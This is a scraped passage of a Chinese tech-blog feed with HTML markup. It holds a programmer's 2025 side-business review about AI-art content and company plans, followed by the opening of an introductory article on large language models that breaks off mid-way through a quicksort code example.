<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1995268800132686540" target="_blank" title="https://zhuanlan.zhihu.com/p/1995268800132686540" ref="nofollow noopener noreferrer">万字长文！搞懂机器学习中半监督学习的经典方法！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1995612529041351227" target="_blank" title="https://zhuanlan.zhihu.com/p/1995612529041351227" ref="nofollow noopener noreferrer">万字长文！搞懂强化学习的基础知识！</a></p>
<h2 data-id="heading-5">模型评估与选择</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1996228177396265403" target="_blank" title="https://zhuanlan.zhihu.com/p/1996228177396265403" ref="nofollow noopener noreferrer">一文搞懂机器学习中的数据划分与验证方法！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1996724312397346362" target="_blank" title="https://zhuanlan.zhihu.com/p/1996724312397346362" ref="nofollow noopener noreferrer">万字长文！搞懂机器学习中的分类|回归|聚类任务都有哪些常用的评估指标！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1997453295883674299" target="_blank" title="https://zhuanlan.zhihu.com/p/1997453295883674299" ref="nofollow noopener noreferrer">机器学习中都有哪些经典的模型调优方法？</a></p>
<p>最新的文章都在公众号aicoting更新，别忘记关注哦！！！</p>
<p>作者：coting</p>
<p>分享是一种信仰，连接让成长更有温度。</p>
<p>我们下次不见不散！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[程序员副业 | 2025 年度复盘｜从个人能力，到可持续商业结构的一年]]></title>    <link>https://juejin.cn/post/7601028900886069294</link>    <guid>https://juejin.cn/post/7601028900886069294</guid>    <pubDate>2026-01-30T15:49:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601028900886069294" data-draft-id="7600982613653979186" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="程序员副业 | 2025 年度复盘｜从个人能力，到可持续商业结构的一年"/> <meta itemprop="keywords" content="后端,创业"/> <meta itemprop="datePublished" content="2026-01-30T15:49:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="嘟嘟MD"/> <meta itemprop="url" content="https://juejin.cn/user/3368559354851470"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            程序员副业 | 2025 年度复盘｜从个人能力，到可持续商业结构的一年
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3368559354851470/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    嘟嘟MD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:49:27.000Z" title="Fri Jan 30 2026 15:49:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2557cd7a86814ef8af74fe2f6ba77795~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=900&amp;h=383&amp;s=91599&amp;e=jpg&amp;b=64a5ef" alt="必看大字最新消息重磅公众号首图(2) (1).jpg" loading="lazy"/></p>
<blockquote>
<p>本文首发于公众号：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F5pCcN4c9RjOBtt0M-RUGaQ" target="_blank" title="https://mp.weixin.qq.com/s/5pCcN4c9RjOBtt0M-RUGaQ" ref="nofollow noopener noreferrer">嘟爷创业日记</a> 。 我已经坚持日更700天+，欢迎过来追剧~</p>
</blockquote>
<p>时间一拖就月底了， 2025年的年度复盘差点难产，但是该写还是要写，对自己的一个交代，也是对新的一年的期待。</p>
<p>回看 2025 年，我最大的感受不是“忙”，而是<strong>终于不再迷茫了</strong>。</p>
<p>这一年，我没有追逐新的风口，也没有再频繁更换方向，而是围绕已经验证过的能力，开始搭建属于自己的商业结构。</p>
<p>如果用一句话总结 2025 年，那就是：</p>
<blockquote>
<p>这是我把个人能力，真正转化为可持续商业系统的一年。</p>
</blockquote>
<p>下面从几个关键模块，系统性地复盘这一年，用nano做的汇总海报真不错~</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36d861b35b37467bb9a9c716cf38c72e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zif5ZifTUQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770392966&amp;x-signature=GF5Ksv8G6ple8e%2FNl2JJowTlYYM%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-0">一、2025年，我在做什么？</h2>
<p>2025 年，我做的事情看起来很多，但主线其实非常清晰：</p>
<ul>
<li>
<p>围绕 <strong>AI 绘画 / ComfyUI</strong> 持续输出内容，打造个人 IP</p>
</li>
<li>
<p>从单一线上创作者，延展到 <strong>线下组织与公司化尝试</strong></p>
</li>
<li>
<p>为下一阶段的 <strong>产品化、系统化、复利化</strong> 做准备</p>
</li>
</ul>
<p>这一年，我不再纠结“要不要做这个项目”，而是在不断问自己：</p>
<blockquote>
<p>这件事，值不值得被长期放大？</p>
</blockquote>
<h2 data-id="heading-1">二、AI 绘画 IP：真正跑通的一年</h2>
<h4 data-id="heading-2">上半年：以服务型收入为主</h4>
<p>2025 年上半年，AI 绘画相关的收入，主要来自和影视机构的合作培训，包括线上和线下的短期课程。这类模式的特点很明显：</p>
<ul>
<li>收入相对稳定</li>
<li>但强依赖时间</li>
<li>天花板清晰可见</li>
</ul>
<p>当时我已经意识到，这并不是我想长期依赖的形态。</p>
<h4 data-id="heading-3">下半年：内容 + IP 的转折点</h4>
<p>从 6 月开始，我开始和平台合作，尝试用 <strong>文章 + 视频</strong> 的方式持续输出内容，并逐步形成组合型收入结构：</p>
<ul>
<li>
<p>平台稿费与创作者激励</p>
</li>
<li>
<p>内容平台的创作收益</p>
</li>
<li>
<p>在文章和视频中自然承接工具类、网盘类等长期分成</p>
</li>
</ul>
<p>这是我第一次非常清晰地感受到：</p>
<blockquote>
<p><strong>内容 + IP + 渠道，本身就是一个可复利的生产系统。</strong></p>
</blockquote>
<p>即使不接任何商单，这套结构也能稳定运转。<br/>
而一旦叠加商单或软文合作，整体上限就会被明显拉高。</p>
<p>更重要的是，这一切都围绕同一个垂直赛道展开，没有分散精力，并且能实现闭环的增长飞轮，是复利的一种体现。</p>
<ul>
<li>目前公众号粉丝：12540</li>
<li>B站粉丝：7795</li>
<li>油管：2460</li>
</ul>
<p>明年复盘的时候再回来对比</p>
<h2 data-id="heading-4">三、线下福 AI：从公益到商业化的探索</h2>
<p>2025 年，我并没有只把重心放在线上。</p>
<p>这一年，我从参与 <strong>福 AI 公益组织</strong> 开始，逐步深入到线下 AI 科普、课程分享，再到后期推动商业化尝试，包括：</p>
<ul>
<li>
<p>视频定制</p>
</li>
<li>
<p>企业培训</p>
</li>
<li>
<p>定向线下课程</p>
</li>
</ul>
<p>到了 2025 年底，我们正式成立了公司，用更规范的方式承接线下业务。</p>
<p>这条线在 2025 年并不是“爆发型收益”，但它的意义在于：</p>
<blockquote>
<p><strong>为未来更大的项目承接能力，提前搭建基础设施。</strong></p>
</blockquote>
<p>我对线下公司的定位也很清晰：不是追求短期规模，而是为 2026–2027 年的企业服务、长期合作打基础。</p>
<h2 data-id="heading-5">四、收入结构的变化，比数字更重要</h2>
<p>这一年，我开始刻意不再纠结“赚了多少”，而是观察 <strong>收入结构是否健康</strong>。</p>
<p>整体来看，收入来源逐渐呈现出几个特点：</p>
<ul>
<li>
<p>内容型收入：稳定、可复制，是基础现金流</p>
</li>
<li>
<p>服务型收入：单价在提升，但不再无限接单</p>
</li>
<li>
<p>商单 / 广告：不确定，但作为增量存在</p>
</li>
<li>
<p>旧副业：逐步退出，不再作为核心投入方向</p>
</li>
</ul>
<p>我在做的，其实是把时间从“短期换钱”，慢慢转向“长期资产”。</p>
<h2 data-id="heading-6">五、2025 年最大的现实问题：时间不够用</h2>
<p>如果说 2025 年最大的挑战是什么，那不是没方向，而是：</p>
<blockquote>
<p><strong>方向太清晰之后，时间开始严重不够用。</strong></p>
</blockquote>
<p>线上内容、线下事务、公司推进，占据了大部分精力，导致一些我非常想做、也非常重要的事情被反复推迟，比如：</p>
<ul>
<li>AI 编程</li>
<li>AI 智能体</li>
<li>产品化（飞书付费手册）</li>
</ul>
<p>这让我意识到一个关键问题：</p>
<blockquote>
<p><strong>学习不能只是“额外任务”，而必须直接服务于业务提效。</strong></p>
</blockquote>
<p>这也直接决定了我 2026 年的学习方向。</p>
<h2 data-id="heading-7">六、这一年踩过的坑</h2>
<p>回看 2025 年，我踩过的坑主要集中在三点：</p>
<ol>
<li><strong>时间碎片化的试错期</strong><br/>
多项目并行，看似努力，实则稀释势能</li>
<li><strong>过度依赖人力交付</strong><br/>
产品化推进不够快，影响长期复利</li>
<li><strong>长期忽视身体与作息</strong><br/>
熬夜和高负荷开始反噬效率</li>
</ol>
<h2 data-id="heading-8">七、2026年规划：把系统搭完整</h2>
<p>2026 年，我给自己的唯一主线很明确：</p>
<blockquote>
<p><strong>把个人能力系统化、产品化，减少对“我本人在线时间”的依赖。</strong></p>
</blockquote>
<p>具体会聚焦在几个方向：</p>
<h4 data-id="heading-9">1. 产品层（必须做成）</h4>
<ul>
<li>飞书付费手册：作为核心流量承接</li>
<li>录播课程 + 直播：卖自己的知识产品</li>
</ul>
<h4 data-id="heading-10">2. 服务层（持续深化）</h4>
<ul>
<li>成品交付（视频 / 图片）</li>
<li>ComfyUI 工作流定制</li>
<li>行业镜像 / 工具服务，按月或按年订阅</li>
</ul>
<h4 data-id="heading-11">3. 能力层（必学）</h4>
<ul>
<li>AI 编程</li>
<li>AI 智能体<br/>
目标不是转型，而是 <strong>提效 + 封装 + 产品化</strong>。</li>
</ul>
<h4 data-id="heading-12">4. 线下公司</h4>
<ul>
<li>稳定运转</li>
<li>承接更成熟的企业项目</li>
<li>不追求爆发，但追求长期可持续</li>
</ul>
<h2 data-id="heading-13">写在最后</h2>
<p>回看 2025 年，我最大的收获不是某个具体成绩，而是终于清楚地知道：</p>
<blockquote>
<p><strong>我在搭一套什么样的系统，通向哪里。</strong></p>
</blockquote>
<p>2026 年，我不会再频繁试错，而是围绕已经验证过的方向，把这套系统一块一块搭完整。</p>
<p>慢一点，但更稳。</p>
<p>上面算是我这一年的总结，我分享出来也是给大家可以近距离看看一个离职的程序员的日常，有做的不好的地方也有做的可取的地方，我也是个普通人，一直在尝试和努力，欢迎来交流，希望2026年发展的更好。</p>
<p>我是嘟嘟，一个12年全栈程序员，现在离职创业，需要你的三连~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[什么是大语言模型-00]]></title>    <link>https://juejin.cn/post/7600976289064042496</link>    <guid>https://juejin.cn/post/7600976289064042496</guid>    <pubDate>2026-01-30T14:56:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600976289064042496" data-draft-id="7600976289064026112" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="什么是大语言模型-00"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-30T14:56:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一诺滚雪球"/> <meta itemprop="url" content="https://juejin.cn/user/2824015112318094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            什么是大语言模型-00
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824015112318094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一诺滚雪球
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T14:56:27.000Z" title="Fri Jan 30 2026 14:56:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>你有没有想过，当你问 ChatGPT 一个问题时，它是如何"思考"并给出回答的？</p>
<p>今天天气怎么样？——抱歉，我无法获取实时天气信息。
请用 JavaScript 写一个快速排序——几秒钟内，代码就出现在屏幕上。</p>
<p>同样是 AI，为什么能写代码却不能查天气？大语言模型的"知识"从哪里来？它是真的"理解"我们的话吗？</p>
<p>这些问题，正是我们探索大语言模型（Large Language Model，LLM）世界的起点。</p>
<hr/>
<h2 data-id="heading-1">1. 什么是大语言模型</h2>
<p><strong>大语言模型（LLM）</strong> 是一种经过海量文本数据训练的深度学习模型，能够理解和生成人类语言。</p>
<h3 data-id="heading-2">关键特征</h3>

























<table><thead><tr><th>特征</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td><strong>大规模训练</strong></td><td>使用 TB 级文本数据</td><td>GPT-4 训练了约 1 万亿 tokens</td></tr><tr><td><strong>深度神经网络</strong></td><td>数十亿到数万亿参数</td><td>GPT-3 有 1750 亿参数</td></tr><tr><td><strong>通用能力</strong></td><td>不需要专门训练就能完成多种任务</td><td>翻译、写作、编程、推理</td></tr></tbody></table>
<h3 data-id="heading-3">通俗理解</h3>
<p>想象一下：</p>
<ul>
<li>你阅读了互联网上几乎所有的文本</li>
<li>你记住了其中的模式、规律和知识</li>
<li>当有人问你问题时，你能根据记忆生成回答</li>
</ul>
<p>这就是大语言模型做的事情！</p>
<h3 data-id="heading-4">核心工作原理</h3>
<p>LLM 的本质是一个<strong>文字接龙机器</strong>：</p>
<pre><code class="hljs language-matlab" lang="matlab">输入: <span class="hljs-string">"今天天气"</span>
LLM 预测下一个词可能是:
- <span class="hljs-string">"真好"</span>    (概率 <span class="hljs-number">30</span><span class="hljs-comment">%)</span>
- <span class="hljs-string">"很热"</span>    (概率 <span class="hljs-number">25</span><span class="hljs-comment">%)</span>
- <span class="hljs-string">"怎么样"</span>  (概率 <span class="hljs-number">20</span><span class="hljs-comment">%)</span>
</code></pre>
<p><strong>训练流程</strong>：</p>
<pre><code class="hljs">┌─────────────────────────────────────────┐
│            LLM 训练流程                   │
├─────────────────────────────────────────┤
│                                         │
│  1. 数据收集                             │
│     ├── 网页文本                         │
│     ├── 书籍文章                         │
│     └── 代码库                           │
│                                         │
│  2. 预训练                               │
│     ├── 学习语言模式                     │
│     ├── 学习世界知识                     │
│     └── 学习逻辑推理                     │
│                                         │
│  3. 微调                                 │
│     ├── 对齐人类偏好                     │
│     ├── 遵循指令                         │
│     └── 安全性训练                       │
│                                         │
└─────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-5">四大核心能力</h3>
<p><strong>1. 语言理解</strong></p>
<ul>
<li>理解文本含义</li>
<li>识别情感倾向</li>
<li>提取关键信息</li>
</ul>
<p><strong>2. 语言生成</strong></p>
<ul>
<li>写文章、写代码</li>
<li>创意写作</li>
<li>总结提炼</li>
</ul>
<p><strong>3. 逻辑推理</strong></p>
<ul>
<li>数学计算</li>
<li>逻辑推理</li>
<li>问题解决</li>
</ul>
<p><strong>4. 少样本学习</strong></p>
<ul>
<li>看几个例子就能学会新任务</li>
<li>不需要重新训练</li>
</ul>
<hr/>
<h2 data-id="heading-6">2. 案例</h2>
<h3 data-id="heading-7">案例 1：少样本学习的神奇之处</h3>
<p>让我们看看 LLM 如何通过几个例子学会新任务：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> prompt = <span class="hljs-string">`
例子1：
输入：苹果
输出：水果

例子2：
输入：胡萝卜
输出：蔬菜

输入：香蕉
输出：？
`</span>;
<span class="hljs-comment">// LLM 能推断：香蕉 → 水果</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2b6a30f81de4e989380d4c407bd6893~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770389789&amp;x-signature=aOmds6PQEGJJhLVF23Ta9w8%2FBX0%3D" alt="image.png" loading="lazy"/></p>
<p><strong>解析</strong>：无需重新训练，只需几个示例，LLM 就能理解分类规律并应用到新问题。</p>
<h3 data-id="heading-8">案例 2：代码生成能力</h3>
<p><strong>输入</strong>："请用 JavaScript 写一个快速排序"</p>
<p><strong>LLM 输出</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">quickSort</span>(<span class="hljs-params">arr</span>) {
  <span class="hljs-keyword">if</span> (arr.<span class="hljs-property">length</span> &lt;= <span class="hljs-number">1</span>) {
    <span class="hljs-keyword">return</span> arr;
  }
  <span class="hljs-keyword">const</span> pivot = arr[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(arr.<span class="hljs-property">length</span> / <span class="hljs-number">2</span>)];
